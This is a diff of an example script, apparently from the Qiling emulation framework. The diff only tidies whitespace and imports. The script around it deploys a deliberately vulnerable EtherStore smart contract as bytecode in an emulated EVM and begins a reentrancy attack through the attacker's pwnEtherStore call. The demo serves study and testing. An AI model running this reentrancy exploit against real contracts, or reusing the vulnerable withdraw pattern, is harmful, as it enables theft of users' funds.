@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-# 
+#
 # Cross Platform and Multi Architecture Advanced Binary Emulation Framework
 #
 
 import sys
-
 sys.path.append("../..")
-from qiling import *
+
+from qiling import Qiling
 from qiling.arch.evm.vm.utils import bytecode_to_bytes, runtime_code_detector
 from qiling.arch.evm.vm.vm import BaseVM
 from qiling.arch.evm.constants import CREATE_CONTRACT_ADDRESS
@@ -29,9 +29,9 @@ if __name__ == '__main__':
     ql.arch.evm.create_account(C2)
     ql.arch.evm.create_account(User1, 100*10**18)
     ql.arch.evm.create_account(User2, 100*10**18)
-    
+
     EtherStore_contract = '0x6080604052670de0b6b3a764000060005534801561001c57600080fd5b506103b08061002c6000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631031ec3114610072578063155dd5ee146100c957806327e235e3146100f65780637ddfe78d1461014d578063e2c41dbc14610178575b600080fd5b34801561007e57600080fd5b506100b3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610182565b6040518082815260200191505060405180910390f35b3480156100d557600080fd5b506100f46004803603810190808035906020019092919050505061019a565b005b34801561010257600080fd5b50610137600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610317565b6040518082815260200191505060405180910390f35b34801561015957600080fd5b5061016261032f565b6040518082815260200191505060405180910390f35b610180610335565b005b60016020528060005260406000206000915090505481565b80600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515156101e857600080fd5b60005481111515156101f957600080fd5b62093a80600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401421015151561024c57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff168160405160006040518083038185875af192505050151561028357600080fd5b80600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555042600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60026020528060005260406000206000915090505481565b60005481565b34600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505600a165627a7a72305820707bf0ae11ce52ff7b7846ede3497d41b6fadea29579773fc70e8e61c0f549f10029'
-    
+
     print('Init Victim   balance is', vm.state.get_balance(User1)/10**18)
     print('Init Attacker balance is', vm.state.get_balance(User2)/10**18)
 
@@ -67,7 +67,7 @@ if __name__ == '__main__':
     res_code = bytecode_to_bytes(res.output)
     runtime_code, aux_data, constructor_args = runtime_code_detector(res_code)
     rt_code1 = bytecode_to_bytes(runtime_code)
-    
+
     print('\n------ Attacker deposit 1 ETH to DeFi contract, Start Reentrancy Attack')
     # 4. User2 pwnEtherStore with 1ETH
     call_data = '0xa75e4625' + ql.arch.evm.abi.convert(['bytes4'], [bytecode_to_bytes('0xe2c41dbc')]) + ql.arch.evm.abi.convert(['bytes4'], [bytecode_to_bytes('0x155dd5ee')])
